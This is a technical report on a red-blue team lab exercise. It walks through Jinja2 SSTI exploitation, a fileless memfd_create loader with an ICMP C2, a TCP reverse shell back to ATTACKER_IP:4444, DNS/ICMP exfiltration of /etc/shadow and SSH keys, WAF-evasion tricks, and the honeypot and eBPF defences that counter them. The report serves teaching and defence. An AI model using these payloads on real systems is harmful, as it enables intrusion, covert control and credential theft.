# Enterprise Attack-Defense Lab: Technical Analysis Report

## 1. Executive Summary

This project implements a comprehensive Cyberattack Kill Chain exercise structured as a multi-round red-blue team engagement. The system spans 15+ components across three functional domains: target infrastructure, red team offensive tooling, and blue team defensive systems.

| Domain | Components | Key Capabilities |
|--------|-----------|-----------------|
| **Target** | `target_app.py`, `honeypot.py` | SSTI-vulnerable Flask API, fake SSH honeypot on port 2222 |
| **Red Team** | `red_attacker.py`, `red_reverse_shell.py`, `exploit.py`, `exfil_agent.py`, `exfil_listener.py`, `recon.sh`, `ip_switch.sh`, `deploy_agent.sh`, `post_exploit.sh` | Fileless ICMP C2 (AES-256-CTR), TCP reverse shell, DNS/ICMP exfiltration, WAF bypass, IP aliasing |
| **Blue Team** | `blue_ebpf_mdr.py` (v1), `blue_ebpf_mdr_v2.py`, `blue_mdr_network.py`, `soc_dashboard.py` | Two-layer defense: network (honeypot + iptables) and kernel (eBPF syscall hooks), real-time SOC dashboard |

The exercise is structured as a **7-round iterative engagement** that demonstrates the adversarial escalation between attack and defense. The red team deploys fileless malware with AES-256-CTR encrypted ICMP C2, adapts when blocked by pivoting to a TCP reverse shell, and exfiltrates data through covert DNS/ICMP channels. The blue team responds with network-layer deception, kernel-level eBPF behavioral detection, and unified SOC visibility.

This report provides in-depth technical analysis of the **underlying principles**, **purpose**, and **impact** of each attack and defense mechanism.

---

## 2. Environment Architecture

```
┌────────────────────────────┐              ┌──────────────────────────────────┐
│   Attacker Machine (WSL2)  │              │     Lab Server (Target + Blue)   │
│                            │              │                                  │
│  red_attacker.py  (C2)     │    ICMP      │  target_app.py    (Flask :9999)  │
│  red_reverse_shell.py      │◄════════════►│  honeypot.py      (SSH :2222)    │
│  exploit.py                │    TCP       │                                  │
│  exfil_listener.py         │◄════════════►│  blue_ebpf_mdr.py    (v1)       │
│  recon.sh                  │    DNS       │  blue_ebpf_mdr_v2.py (v2)       │
│  ip_switch.sh              │◄════════════►│  blue_mdr_network.py             │
│  deploy_agent.sh           │              │  soc_dashboard.py   (:8080)     │
│  post_exploit.sh           │              │                                  │
└────────────────────────────┘              └──────────────────────────────────┘
```

- **Attacker (WSL2)**: Ubuntu 22.04, root privileges for raw ICMP sockets
- **Lab Server (Native Linux)**: Ubuntu 24.04, runs target services, eBPF defense, and SOC dashboard
- **Protocols**: ICMP echo request (fileless C2), TCP (reverse shell), DNS/ICMP (exfiltration)

---

## 3. Target Infrastructure

### 3.1 Vulnerable Flask Application (`target/target_app.py`)

**Function**: A web-based "Diagnostic Portal" that accepts user queries on the `/diag` endpoint (port 9999).

**Vulnerability**: Server-Side Template Injection (SSTI) via Jinja2 (CWE-1336).

**Root Cause -- Two-Step Composition Flaw**:

```python
# Step 1: Python f-string embeds user input into template SOURCE CODE
template = f"<pre>Query: {user_input}</pre>"

# Step 2: Jinja2 evaluates {{ }} expressions as live code
render_template_string(template)
```

If `user_input` contains `{{ 7*7 }}`, the resulting template string is `<pre>Query: {{ 7*7 }}</pre>`, and Jinja2 evaluates `7*7` as the integer `49`.

**Safe Pattern** -- pass user data as a Jinja2 *variable*, not as template source:

```python
render_template_string("<pre>Query: {{ q | e }}</pre>", q=user_input)
# Jinja2 treats q as data, never code; auto-escaping prevents injection
```

**SSTI to RCE Escalation Path**:

Jinja2 expressions can traverse Python's object model:

```
config                           → Flask config object
  .__class__                     → <class 'flask.config.Config'>
  .__init__                      → Config's constructor method
  .__globals__                   → module-level globals of flask/config.py
  ['os']                         → os module (flask.config imports os)
  .popen('cmd')                  → subprocess execution → RCE
```

**Why this path works**:
1. Python's **introspection** allows any object to reach its class, then the module globals of any method defined in that module
2. Flask's `config.py` module has `import os` at the top level, placing `os` in `Config.__init__.__globals__`
3. Jinja2's sandbox restricts attribute names starting with `_`, but the traversal chain uses `__class__`, `__init__`, `__globals__` -- the sandbox check is on the attribute *name*, not the resolution result

**Impact**: Full Remote Code Execution (RCE) with the Flask process privileges.

### 3.2 SSH Honeypot (`target/honeypot.py`)

**Function**: A low-interaction SSH honeypot listening on port 2222, part of the blue team's cyber deception strategy.

**Principle**: A honeypot is a decoy service that exists solely to detect unauthorized access. Any interaction with it is inherently suspicious because legitimate users have no reason to connect.

**Mechanism**:
1. Sends a realistic `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\n` banner (RFC 4253 compliant) that fools nmap service detection (`-sV`)
2. Waits for the attacker's client hello data (up to 5 seconds)
3. Returns a fake `Permission denied (publickey,password)` response
4. Logs the attacker's IP, timestamp, port, and client data to `trap.log`

**Integration**: The `trap.log` file is continuously monitored by `blue_mdr_network.py`, which extracts attacker IPs and immediately blocks them via iptables. This creates a seamless detection-to-response pipeline.

**Impact**: Zero false-positive detection -- every connection to port 2222 is, by definition, unauthorized.

---

## 4. Red Team Attack Analysis

### 4.1 Phase 1: Reconnaissance

**Tools**: `recon.sh`, manual nmap

**Action**: Identify target services and map the attack surface.

```bash
bash red_team/recon.sh <TARGET_IP>
# Equivalent to: nmap -p 2000-10000 -sV <TARGET_IP>
```

**Key Discoveries**:
- Port 2222: SSH banner (honeypot -- triggers MDR IP block if connected)
- Port 9999: Diagnostic API (Flask SSTI vulnerability, the real target)

**MITRE ATT&CK**: T1595 (Active Scanning)

**Impact**: Confirms the attack vector and maps the target infrastructure. If the attacker connects to port 2222, their IP is logged and blocked by the network MDR.

---

### 4.2 Phase 2: Weaponization and Delivery -- Fileless ICMP C2

**Tool**: `red_attacker.py`

**Action**: Construct and deliver an SSTI payload that achieves fileless RCE with an AES-256-CTR encrypted ICMP C2 channel.

#### 4.2.1 SSTI Payload Delivery Chain (4 Stages)

The attack is delivered as a single HTTP POST request that triggers a multi-stage execution chain:

**Stage 1 -- SSTI Injection**: The Jinja2 expression `{{ config.__class__.__init__.__globals__['os'].popen('...').read() }}` traverses Python's object model to reach `os.popen()`, which spawns a shell subprocess.

**Stage 2 -- Base64 Shell Pipeline**: The shell command is `echo <B64>|base64 -d|python3`. This decodes the loader script and pipes it to python3.

**Stage 3 -- Loader** (runs as python3 subprocess):
1. Decodes the agent from base64
2. Calls `memfd_create` (syscall 319) to create an anonymous fd
3. Writes agent code into the fd
4. Calls `fork()` -- parent exits (Flask popen returns)
5. Child calls `execve("/usr/bin/python3", ["/proc/<pid>/fd/<N>"])` -- runs agent from memory

**Stage 4 -- Agent** (runs as orphan process, entirely in RAM): Opens a raw ICMP socket and begins beaconing to the C2 server.

#### 4.2.2 Double Base64 Encoding

The payload uses double base64 encoding to eliminate all escaping issues:

```
[Agent Python source]
    → base64 encode → agent_b64
        → embed in Loader Python script
            → base64 encode → loader_b64
                → embed in SSTI string: echo loader_b64 | base64 -d | python3
                    → URL encode → curl -d "query=..."
```

**Why double, not single**: The SSTI string uses single quotes to wrap the shell command. If the loader script contains quotes or special characters, it breaks the SSTI syntax. Base64 output only contains `A-Za-z0-9+/=`, which are safe in both shell and Jinja2 contexts.

#### 4.2.3 Fileless Execution via memfd_create

**Problem**: Traditional malware writes executables to disk (`/tmp/backdoor`), creating file artifacts detectable by filesystem watchers (inotify), on-access AV scanners, and forensic analysis.

**Solution**: Linux `memfd_create(2)` system call (syscall 319 on x86_64, available since Linux 3.17).

**Core Mechanism**:

```
memfd_create(name, flags) → fd
```

1. Creates an **anonymous file** in the kernel's **tmpfs layer**
2. Returns a file descriptor (fd) that behaves like a regular file
3. The fd is **NOT linked to any directory entry** -- invisible in all mounted filesystems
4. Content resides in **page cache (RAM)**, never written to a block device
5. `/proc/<pid>/fd/<N>` provides a synthetic path for `execve()`

**Attack Chain**:

```
fd = ctypes.CDLL(None).syscall(319, b"", 0)   # anonymous fd in RAM
os.write(fd, agent_code)                        # write payload to fd (still in RAM)
pid = os.fork()                                 # fork: parent returns for Flask response
  ├── parent: exits                             # popen() completes, HTTP response sent
  └── child: os.execve("/usr/bin/python3",      # execute agent from memfd
        ["python3", "/proc/<pid>/fd/<N>"],       # kernel resolves path → reads memfd → RCE
        dict(os.environ))
```

**Why `/proc/<pid>/fd/N` works with execve**:
- procfs is a virtual filesystem; each fd entry is a symlink to the kernel's `struct file` object
- `execve()` resolves the symlink, reaches the anonymous inode, and reads the memfd content
- `fork()` duplicates the fd table -- the child's fd copy remains valid even after the parent exits

**Why fork() is necessary**:
- The SSTI `popen()` subprocess must exit promptly for Flask to return the HTTP response
- `fork()` creates a child that runs independently; when the parent exits, the child becomes an orphan, re-parented to PID 1
- The child's memfd fd is a duplicate (fork copies fd table), so the memfd remains valid

**Impact**: Zero file artifacts on disk. Evades all file-based AV/EDR detection.

#### 4.2.4 AES-256-CTR Encryption via OpenSSL

The ICMP C2 channel uses AES-256-CTR encryption implemented via ctypes calls to the system's OpenSSL libcrypto library.

**Implementation**:

```python
_libcrypto = ctypes.CDLL(ctypes.util.find_library('crypto') or 'libcrypto.so')
# Uses EVP_CIPHER_CTX_new, EVP_aes_256_ctr, EVP_EncryptInit_ex, EVP_EncryptUpdate
AES_KEY = hashlib.sha256(SHARED_SECRET).digest()  # 32 bytes for AES-256
```

**Key Derivation**: `AES_KEY = SHA-256(SHARED_SECRET)` produces a 32-byte key.

**Per-Packet**: A random 16-byte IV (`os.urandom(16)`) is generated for each packet and prepended to the ciphertext. This ensures that identical plaintexts produce different ciphertexts.

**Properties of AES-256-CTR**:

| Property | Description |
|----------|-------------|
| Algorithm | AES-256 in Counter (CTR) mode |
| Key space | 2^256 (computationally infeasible to brute-force) |
| Semantic security | Random IV per packet prevents pattern analysis |
| No padding | Ciphertext length equals plaintext length (ideal for ICMP payload) |
| Symmetric CTR | Encrypt and decrypt are the same operation (XOR with keystream) |
| Dependencies | System libcrypto via ctypes (pre-installed on all Linux distros) |

**Why ctypes+OpenSSL instead of a pip package**: The agent runs on the target machine via memfd_create. Using ctypes to call the system's pre-installed OpenSSL library means zero pip dependencies are required on the target, making the agent self-contained with only Python stdlib.

**Comparison with the pedagogical XOR cipher** (historical context):

| Property | XOR (Original) | AES-256-CTR (Current) |
|----------|----------------|----------------------|
| Key derivation | Fixed 16-byte plaintext key | SHA-256(shared_secret) → 32 bytes |
| IV/Nonce | None | Random 16-byte IV per packet |
| Known-plaintext resistance | Trivially broken (key XOR plaintext = key) | Computationally infeasible |
| Frequency analysis | Vulnerable (no IV means identical plaintext → identical ciphertext) | Immune (random IV per packet) |
| Implementation | Pure Python | ctypes + OpenSSL libcrypto |
| Dependencies | None | System libcrypto (pre-installed on Linux) |

**Security Significance**: The upgrade from XOR to AES-256-CTR demonstrates that real-world malware increasingly uses strong cryptography, rendering payload inspection useless. This validates the necessity of behavior-based detection (eBPF), which monitors what a process *does* (syscall patterns) rather than what its traffic *contains*.

#### 4.2.5 ICMP Covert Channel

ICMP (Internet Control Message Protocol, RFC 792) is a Layer 3 protocol for network diagnostics.

**Why ICMP is suitable for covert channels**:
1. Firewalls typically **allow ICMP by default** (blocking it breaks ping/traceroute)
2. ICMP Echo Request/Reply carry an **arbitrary-length data payload** -- the protocol imposes no constraints on content
3. Most IDS/IPS inspect TCP/UDP ports and payloads but treat ICMP payload as opaque diagnostic data
4. ICMP has **no port numbers** → no connection state → harder to track

**Linux Raw Socket Behavior**:
```python
socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)  # requires root or CAP_NET_RAW
```
- The kernel delivers a COPY of each incoming ICMP packet to raw sockets
- The kernel ALSO auto-replies to echo requests (sends echo reply)
- We filter by ICMP ID field (0x1337) and type (8 = echo request)

**Protocol Design**:

```
┌──────────────────────────────────────────────────────┐
│ IP Header (20B) │ ICMP Header (8B) │ Payload        │
│                 │ type=8 code=0    │ ┌─────────────┐│
│                 │ checksum         │ │ MAGIC  (1B) ││
│                 │ ID=0x1337        │ │ MSG_TYPE(1B)││
│                 │ SEQ              │ │ IV (16B)    ││
│                 │                  │ │ AES-CTR data││
│                 │                  │ └─────────────┘│
└──────────────────────────────────────────────────────┘

MSG_TYPE:
  0x01 = Heartbeat (Agent → C2): hostname, UID, kernel version
  0x02 = Command   (C2 → Agent): shell command to execute
  0x03 = Result    (Agent → C2): chunked output with [idx:u16][total:u16] header
```

Both sides send ICMP type 8 (echo request) and ignore type 0 (echo reply), since kernel auto-replies carry the original payload, not C2 commands.

**ICMP Checksum (RFC 1071)**:
1. Treat the packet as a sequence of 16-bit big-endian integers
2. Sum all integers using ones' complement addition (carry wraps around)
3. Take the ones' complement (bitwise NOT) of the final sum

The receiver performs the same calculation over the entire packet including the checksum field; a result of `0xFFFF` indicates validity.

#### 4.2.6 C2 Agent Behavior

**Agent Execution Loop** (runs entirely in memory):
1. Initial heartbeat: transmit hostname, UID, kernel version
2. Repeat heartbeat every 30 seconds
3. Receive MSG_COMMAND → `subprocess.run(cmd, shell=True, capture_output=True, timeout=15)`
4. Split output into 480-byte chunks → encrypt with per-chunk random IV → transmit each
5. On `__exit__` command → close socket and terminate

**Timing Jitter**:
```python
time.sleep(random.uniform(1.0, 2.5))  # random delay each loop iteration
time.sleep(0.05)                       # 50ms inter-chunk delay
```
Random delays make traffic pattern analysis (e.g., periodic beacon detection) more difficult for the blue team.

**C2 Server Architecture** (`C2Server` class):
- **Main thread**: Interactive command prompt (blocking input)
- **Listener thread**: Background ICMP packet capture and result reassembly
- **Communication**: `threading.Event` for result synchronization between threads
- **Commands**: `<cmd>` (execute on target), `payload` (print curl command), `status` (agent info), `exit` (kill agent), `quit` (leave C2, agent stays alive)

**MITRE ATT&CK**: T1190, T1059.006, T1620, T1027, T1095

**Impact**: Full remote shell access, with communication hidden inside ICMP traffic, encrypted with AES-256-CTR.

---

### 4.3 Phase 3: Post-Exploitation

**Tools**: `post_exploit.sh`, C2 shell commands

**Action**: Execute reconnaissance and information gathering from within the compromised target.

```
C2> whoami          → confirm execution identity
C2> id              → UID/GID information
C2> uname -a        → OS and kernel version
C2> cat /etc/passwd → user enumeration
C2> ip addr         → network interface configuration
C2> netstat -tlnp   → listening services
```

**MITRE ATT&CK**: T1082 (System Information Discovery)

---

### 4.4 Phase 4: Evasion -- IP Alias Bypass

**Tool**: `ip_switch.sh`

**Context**: After the red team's reconnaissance triggers the honeypot on port 2222, the network MDR blocks their IP via iptables. The red team must regain network access.

**Mechanism**: IP aliasing adds a secondary IP address to the same network interface:

```bash
sudo ip addr add 172.22.137.15/20 dev eth0
```

| IP | Role | Status |
|----|------|--------|
| 172.22.137.14 (primary) | Triggered honeypot | Blocked by iptables DROP |
| 172.22.137.15 (alias) | Attack via port 9999 | Not blocked (new, unknown IP) |

**Why this works**: iptables rules are IP-based. A new source IP has no matching DROP rule, so packets pass through.

**Why this is insufficient alone**: IP-based blocking is inherently limited. The blue team must also deploy behavior-based detection (eBPF) that operates independently of source IP.

**MITRE ATT&CK**: T1036 (Masquerading)

---

### 4.5 Phase 5: Evasion -- TCP Reverse Shell (eBPF v1 Bypass)

**Tool**: `red_reverse_shell.py`

**Context**: The blue team has deployed eBPF v1 (`blue_ebpf_mdr.py --kill`), which detects and kills the fileless ICMP C2. The red team must adapt.

**Bypass Analysis**: eBPF v1 hooks three syscalls. The reverse shell triggers none of them:

| eBPF v1 Hook | Triggered? | Reason |
|-------------|-----------|--------|
| `memfd_create` | No | No memfd; uses fork() directly |
| `execve /proc/fd` | No | Executes `/bin/bash`, not from `/proc/fd` |
| `socket(SOCK_RAW)` | No | Uses `SOCK_STREAM` (TCP), not `SOCK_RAW` |

**Attack Chain**:

```
SSTI → os.popen → base64 -d | python3 → fork()
  └→ child: socket(AF_INET, SOCK_STREAM)
       → connect(ATTACKER_IP:4444)
       → dup2(sock_fd, 0)    ← redirect stdin
       → dup2(sock_fd, 1)    ← redirect stdout
       → dup2(sock_fd, 2)    ← redirect stderr
       → pty.spawn("/bin/bash")  ← interactive shell
```

**Key Differences from `red_attacker.py`**:
- No `memfd_create` (no fileless staging)
- No ICMP raw socket (standard TCP connection)
- No `execve` from `/proc/fd` (executes `/bin/bash` normally)
- No `sudo` required (TCP socket, not raw ICMP)

**Delivery**: Same SSTI injection mechanism, but the base64-decoded payload is a simple fork+connect+dup2+pty script instead of the memfd loader.

**Listener**: Built-in TCP listener (`select()`-based) that catches the incoming reverse shell connection on port 4444.

**MITRE ATT&CK**: T1059.006, T1071.001

**Impact**: Full interactive shell access that completely bypasses eBPF v1 detection.

---

### 4.6 Phase 5b: Data Exfiltration

**Tools**: `exfil_agent.py` (target-side), `exfil_listener.py` (attacker-side), `deploy_agent.sh` (deployment helper)

**Purpose**: After establishing access, exfiltrate sensitive data through covert channels that bypass standard monitoring.

#### 4.6.1 Exfiltration Agent (`exfil_agent.py`)

Deployed to the target via the C2 shell or reverse shell. Collects sensitive files automatically:
- `/etc/passwd`, `/etc/shadow`
- SSH keys (`~/.ssh/`)
- Bash history (`~/.bash_history`)
- Application source code
- Crontab and environment variables
- Other users' home directory contents

**Channel Auto-Detection**: The agent probes available exfiltration channels in priority order:
1. **DNS** (via `dig` command) -- preferred
2. **DNS** (via Python socket fallback) -- if `dig` not available
3. **ICMP** (via `ping`) -- last resort

**Self-Deletion**: After exfiltration completes, the agent deletes its own file from disk (`os.remove(os.path.abspath(__file__))`), removing forensic evidence.

#### 4.6.2 DNS Exfiltration Channel

Data is Base32-encoded and embedded as subdomain labels in DNS queries:

```
Protocol:
  START: start.<fname_b32>.<file_id>.x.exfil.local
  DATA:  <seq>-<total>.<chunk_b32>.<file_id>.x.exfil.local
  END:   end.<md5_checksum>.<file_id>.x.exfil.local
```

- Chunk size: 50 bytes per DNS query
- Random inter-packet delay: 0.1--0.5 seconds
- Integrity: MD5 checksum in END signal for reassembly verification

#### 4.6.3 ICMP Exfiltration Channel

Data is hex-encoded and embedded in the padding pattern of ICMP echo requests via the `ping -p` option:

```
Protocol (16-byte payload per ping):
  START: magic(2) + type=0x01(1) + file_id(2) + filename(11)
  DATA:  magic(2) + type=0x00(1) + file_id(2) + seq(2) + total(2) + data(7)
  END:   magic(2) + type=0x02(1) + file_id(2) + checksum(8) + pad(3)
```

- Magic marker: `0xEFBE` for packet identification
- Chunk size: 7 bytes per ICMP packet
- Random inter-packet delay: 0.2--0.8 seconds

#### 4.6.4 Exfiltration Listener (`exfil_listener.py`)

Runs on the attacker machine. Simultaneously listens on:
- **UDP port 53** (fake DNS server): Parses DNS queries, extracts Base32 data from subdomain labels, sends NXDOMAIN responses
- **Raw ICMP socket**: Captures ICMP echo requests, searches for `0xEFBE` magic marker in payload

Both channels use a shared reassembly engine with:
- Per-file chunk tracking with sequence numbers
- MD5 checksum verification on completion
- Safe file writing to `./loot/` directory with mode 0600
- Privilege dropping after binding raw socket (security: runs as non-root after socket creation)

**MITRE ATT&CK**: T1048.003 (Exfiltration Over Alternative Protocol), T1005 (Data from Local System)

---

### 4.7 Legacy WAF Bypass (`red_team/exploit.py`)

**Purpose**: Backup attack tool for scenarios with a Web Application Firewall (WAF).

**Bypass Techniques**:
- `${IFS}` (Internal Field Separator): Replaces spaces to evade WAF space-matching rules
- Base64 encoding: Encodes the entire payload to avoid keyword blacklists
- `b\a\s\h`: Backslash obfuscation evades literal string matching for "bash"

**MITRE ATT&CK**: T1190, T1059.006, T1027

**Note**: This tool targets an older socket-based target application. It is retained as a backup and for demonstrating WAF evasion principles.

---

### 4.8 Shell Script Utilities

| Script | Purpose | MITRE ATT&CK |
|--------|---------|--------------|
| `recon.sh` | Automated nmap SYN scan + service version detection | T1595 |
| `ip_switch.sh` | IP alias management (add/remove/status) for MDR bypass | T1036 |
| `deploy_agent.sh` | Generates base64-encoded deployment command for exfil agent | T1059 |
| `post_exploit.sh` | Post-exploitation enumeration (whoami, uname, ip addr, netstat) and persistence via crontab | T1082, T1053.003 |

---

## 5. Blue Team Defense Analysis

### 5.1 Defense-in-Depth Architecture

The blue team implements a two-layer defense architecture, each layer addressing different threat vectors:

```
┌─────────────────────────────────────────────────────┐
│  Layer 1 — Network (Cyber Deception)                │
│  honeypot.py (port 2222) → trap.log →               │
│  blue_mdr_network.py → iptables DROP                │
│  Detects: reconnaissance, blocks known-bad IPs       │
│  Limitation: attacker can change IP to bypass        │
├─────────────────────────────────────────────────────┤
│  Layer 2 — Kernel (eBPF Behavioral Detection)       │
│  v1: memfd_create + execve + raw ICMP socket         │
│  v2: + connect (suspect port) + dup2/dup3 (shell)   │
│  Detects: malicious behavior, regardless of source   │
│  Limitation: must know which syscalls to monitor     │
├─────────────────────────────────────────────────────┤
│  Visibility — SOC Dashboard (port 8080)             │
│  Aggregates all events in real-time web UI           │
└─────────────────────────────────────────────────────┘
```

**Principle**: Each layer has inherent limitations. Only their combination provides robust protection. Network-layer defense blocks known-bad IPs but is bypassed by IP aliasing. Kernel-layer defense detects malicious behavior regardless of source IP but requires knowledge of which syscalls to monitor.

---

### 5.2 Layer 1: Network MDR (`blue_team/blue_mdr_network.py`)

**Mechanism**: A monitoring daemon that polls `trap.log` (written by the honeypot) for new attacker IP entries. Upon detection, it immediately executes:

```
iptables -I INPUT 1 -s <attacker_ip> -j DROP
```

The rule is inserted at **position 1** (highest priority) in the INPUT chain, ensuring it takes precedence over any existing ACCEPT rules.

**Implementation Details**:
- IP extraction: Regex pattern matching on `trap.log` entries
- Deduplication: Tracks blocked IPs in a set; skips already-blocked addresses
- `--cleanup` flag: Removes all added iptables rules on exit
- `--soc-log` flag: Writes events to JSONL file for SOC dashboard integration
- Polling interval: Configurable (default 1 second)

**Effectiveness**: Zero false-positive detection. Any connection to the honeypot on port 2222 is unauthorized by definition.

**Limitation**: IP-based blocking can be circumvented by changing the source IP (e.g., via IP aliasing with `ip_switch.sh`). This motivates the need for Layer 2.

---

### 5.3 Layer 2: eBPF Kernel-Level Detection

#### 5.3.1 eBPF Architecture Overview

**eBPF (extended Berkeley Packet Filter)** is a technology that allows sandboxed programs to run inside the Linux kernel WITHOUT modifying kernel source code or loading kernel modules.

**Execution Pipeline**:
```
C source → Clang/LLVM compile → eBPF bytecode → Kernel Verifier validation
  → JIT compile to x86_64 native code → attach to Tracepoint → zero-overhead execution
```

**Safety Guarantees (enforced by Verifier)**:
- No unbounded loops (provable termination required)
- No out-of-bounds memory access
- No arbitrary pointer dereference
- Stack size limited to 512 bytes
- **An eBPF program CANNOT crash or hang the kernel**

**Why eBPF is ideal for security monitoring**:
- Runs in kernel space → zero context-switch overhead
- Sees ALL syscalls before they execute (tracepoints on `sys_enter_*`)
- Can read process metadata (PID, UID, comm) from kernel `task_struct`
- Can actively respond: `bpf_send_signal()` kills processes from kernel space
- Cannot be evaded by userspace anti-debugging or rootkit techniques

#### 5.3.2 Tracepoints vs Kprobes

| Property | Tracepoint | Kprobe |
|----------|-----------|--------|
| Type | Static (compiled into kernel) | Dynamic (runtime injection) |
| Stability | Stable ABI across versions | Function signatures may change |
| Trigger timing | Syscall entry/exit | Any kernel function |
| Use case | Syscall monitoring | Deep kernel debugging |

We choose **Tracepoints** because:
1. `sys_enter_*` fires BEFORE the syscall executes → preemptive kill possible
2. Stable across kernel 5.x--6.x
3. BCC provides clean `TRACEPOINT_PROBE()` macros

#### 5.3.3 `bpf_send_signal(SIGKILL)` Mechanism

Available since Linux 5.3. This BPF helper sends a signal to the CURRENT task (the process that triggered the tracepoint).

**Why more effective than userspace `kill()`**:

```
eBPF path (bpf_send_signal):
  syscall entry → tracepoint fires → eBPF runs →
  → bpf_send_signal(9) → process killed (syscall never completes)
  Latency: < 1 microsecond

Userspace path (kill()):
  syscall entry → tracepoint fires → eBPF sends perf event →
  → Python reads event → Python calls os.kill() → kernel delivers signal
  Latency: milliseconds (malware may have already completed its operation)
```

**Key difference**: With `bpf_send_signal`, the process is killed BEFORE the syscall handler runs. The attack chain is broken at the very first step.

#### 5.3.4 eBPF Data Structures

**BPF_PERF_OUTPUT (Perf Ring Buffer)**:
- Lock-free circular buffer shared between kernel and userspace via mmap
- Kernel writes events; Python reads events via callback
- Zero-copy communication

**BPF_HASH (Hash Map)**:
- `memfd_pids`: tracks PIDs that called memfd_create (for correlation)
- `whitelist`: userspace writes safe PIDs, kernel reads during hook execution
- `suspect_ports` (v2): configurable suspicious destination ports
- `dup2_tracker` (v2): per-PID bitmask tracking fd 0/1/2 redirection

---

### 5.4 eBPF MDR v1 (`blue_team/blue_ebpf_mdr.py`)

**Three tracepoint hooks** detect fileless malware:

| Hook | Tracepoint | Detection Logic | Severity |
|------|-----------|----------------|----------|
| Hook 1 | `sys_enter_memfd_create` | Any invocation → record PID + timestamp for correlation | HIGH |
| Hook 2 | `sys_enter_execve` | Pattern-match filename for `/proc/<pid>/fd/*` → fileless exec confirmed | CRITICAL |
| Hook 3 | `sys_enter_socket` | `AF_INET(2) + SOCK_RAW(3) + IPPROTO_ICMP(1)` + PID correlates with memfd | CRITICAL |

**Hook 1 -- memfd_create detection**:
- Fires at syscall entry, BEFORE the anonymous fd is created
- Records PID + timestamp in `memfd_pids` hash map for later correlation
- In `--kill` mode, `bpf_send_signal(9)` terminates the process before the fd exists

**Hook 2 -- Fileless execution detection**:
- Reads the `filename` argument of execve
- Checks prefix: starts with `/proc/` (6 bytes)
- Scans positions 6--19 for `/fd/` substring (PID can be 1--7 digits)
- Bounded loop (14 iterations) satisfies eBPF verifier's termination requirement

**Hook 3 -- ICMP covert channel detection**:
- Filters for `socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)` specifically
- Performs **correlation**: checks `memfd_pids` hash map for current PID or parent PID
- If correlated: "CORRELATED:memfd+icmp" → fileless C2 confirmed (CRITICAL)
- If standalone: "raw_icmp_socket" → alert only (could be legitimate ping)

**Correlation Detection (Multi-Indicator)**:
- `memfd_create` alone → HIGH (could be legitimate: Chrome IPC, systemd)
- Raw ICMP socket alone → ALERT (could be ping)
- `memfd_create` + raw ICMP socket → **CRITICAL + CORRELATED** (fileless C2 confirmed)

**Cold-Start Detection**: `/proc/*/exe` scanner checks for already-running memfd processes at startup, covering the gap before eBPF hooks are active. If `--kill` is enabled, detected processes are killed immediately via `os.kill(pid, SIGKILL)`.

**Whitelist**: Self-PID is always whitelisted. Additional PIDs can be specified via `--whitelist 1234,5678`.

---

### 5.5 eBPF MDR v2 (`blue_team/blue_ebpf_mdr_v2.py`)

**Why v2 is needed**: v1 only detects fileless malware that uses `memfd_create` + ICMP raw sockets. A standard TCP reverse shell (fork → connect → dup2 → pty.spawn) bypasses ALL v1 hooks because it never calls `memfd_create` or opens a raw socket.

**v2 retains all 3 v1 hooks** and adds 3 new hooks:

| Hook | Tracepoint | Detection Logic | Severity |
|------|-----------|----------------|----------|
| Hook 4 | `sys_enter_connect` | Destination port matches configurable suspicious-ports list | CRITICAL |
| Hook 5 | `sys_enter_dup2` | Per-PID bitmask; when fd 0,1,2 all redirected → reverse shell confirmed | CRITICAL |
| Hook 6 | `sys_enter_dup3` | Same as Hook 5 (covers `os.dup2(fd, fd2, inheritable=False)` code path) | CRITICAL |

#### Hook 4 -- Suspicious Port Detection (`sys_enter_connect`)

**Mechanism**: Reads the first 8 bytes of `sockaddr_in` from userspace to extract `sin_family` and `sin_port`. Checks the port against the `suspect_ports` BPF_HASH map.

**Default suspicious ports**: 4444, 4445, 5555, 1234, 1337 (configurable via `--suspect-ports`).

```c
// Read sockaddr: [family:2][port:2][addr:4]
u16 family = *(u16 *)&sa_buf[0];
u16 port_be = *(u16 *)&sa_buf[2];
u16 port = ntohs(port_be);

u8 *is_suspect = suspect_ports.lookup(&port);
if (!is_suspect) return 0;  // Not suspicious, ignore
```

**Advantage**: Fast detection at connection time.
**Limitation**: Only catches connections to known suspicious ports. Reverse shells on port 80/443 would evade this hook alone.

#### Hook 5/6 -- Reverse Shell Pattern Detection (`sys_enter_dup2`, `sys_enter_dup3`)

**Mechanism**: Tracks a per-PID bitmask in the `dup2_tracker` BPF_HASH. Each time a process calls `dup2(oldfd, newfd)` where `newfd` is 0, 1, or 2, the corresponding bit is set:

```c
u8 new_mask = mask ? *mask : 0;
new_mask |= (1 << newfd);       // Set bit for fd 0, 1, or 2
dup2_tracker.update(&e.pid, &new_mask);

if (new_mask == 0x07) {         // All three bits set: 0b111 = 7
    // Reverse shell confirmed: stdin + stdout + stderr all redirected
    bpf_send_signal(9);
}
```

**Why both dup2 AND dup3**: Python's `os.dup2(fd, fd2, inheritable=False)` calls `dup3()` (with `O_CLOEXEC` flag) instead of `dup2()`. Without Hook 6, an attacker could bypass detection by passing `inheritable=False`.

**Advantage**: Port-agnostic. Catches reverse shells on ANY port, including 80 or 443.
**Principle**: The behavioral signature of a reverse shell (redirecting all three standard file descriptors) is invariant regardless of the transport protocol or port.

#### v2 SOC Integration

When `--soc-log` is specified, v2 writes JSON events to a JSONL file that the SOC dashboard reads in real-time:

```json
{
    "ts": "2024-01-15 14:30:22",
    "source": "EBPF_v2",
    "event": "REVERSE_SHELL",
    "severity": "CRITICAL",
    "action": "KILLED",
    "detail": "PID:12345 PPID:12340 REVERSE_SHELL:fd0+fd1+fd2_hijack"
}
```

---

### 5.6 SOC Dashboard (`blue_team/soc_dashboard.py`)

**Purpose**: A Flask-based web application (port 8080) that aggregates events from all defensive components and displays them in a real-time dark-themed SOC console.

**Architecture**:

```
Data Sources                 Dashboard Server                Browser
┌────────────┐              ┌──────────────────┐           ┌──────────┐
│ trap.log   │──(poll)──────│ FileWatcher      │           │          │
│ (honeypot) │              │   parse_trap_log │──(events)─│  SSE     │
├────────────┤              ├──────────────────┤           │  stream  │
│ soc_events │──(poll)──────│ FileWatcher      │           │  auto-   │
│ .jsonl     │              │   parse_soc_jsonl│──(events)─│  scroll  │
├────────────┤              ├──────────────────┤           │          │
│ HTTP POST  │──(direct)────│ /api/event       │──(events)─│          │
└────────────┘              └──────────────────┘           └──────────┘
```

**Features**:
- **Server-Sent Events (SSE)** via `/stream` endpoint for real-time browser updates
